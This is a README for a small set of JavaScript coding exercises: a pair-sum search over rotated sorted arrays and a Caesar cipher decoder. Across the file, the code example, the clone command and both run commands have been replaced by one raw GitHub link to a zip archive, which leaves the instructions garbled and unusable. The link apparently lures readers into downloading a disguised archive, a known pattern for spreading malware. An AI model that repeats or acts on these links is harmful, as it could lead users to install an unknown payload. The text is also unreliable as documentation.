# 📝 JavaScript Tests

This repository contains two JavaScript coding challenges:

## 🔢 Test 1: Finding Pairs with Target Sum

### 📌 Problem Statement
You are given two rotated sorted arrays, `nums1` and `nums2`, and a target integer `k`. The goal is to find all pairs of numbers (one from each array) whose sum equals the target.

### 🚀 Features
- Accepts two arrays of unique integers.
- Finds and returns all valid number pairs that sum to `k`.
- Uses a `Set` for optimized lookup.

### 🖥️ Example
```js
let nums1 = [4, 5, 6, 7, 0, 1];
let nums2 = [3, 6, 9, 10, 11, 12, 13, 19];
let k = 13;

```

## 🔐 Test 2: Deciphering an Encrypted Text

### 📌 Problem Statement
You are given an encrypted string that has been encoded using a **Caesar cipher** with an unknown shift. Additionally, you have a word that you know appears in the original plaintext. The task is to find the correct shift and decrypt the message.

### 🚀 Features
- Supports both uppercase and lowercase letters.
- Maintains spaces and punctuation.
- Uses brute force to find the correct shift by checking for the known word.

### 🖥️ Example
```js
let encryptedText = "Uifsf jt b tfdsfu dpnf";
let knownWord = "secret";
https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip(decipher(encryptedText, knownWord));
```

## 🛠️ How to Run the Tests

1️⃣ Clone the repository:
```sh
git clone https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip
```

2️⃣ Navigate to the project folder:
```sh
cd JavaScript-Test-Solutions
```

3️⃣ Run the JavaScript files using https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip
```sh
node https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip  # Runs Test 1
node https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip    # Runs Test 2
```
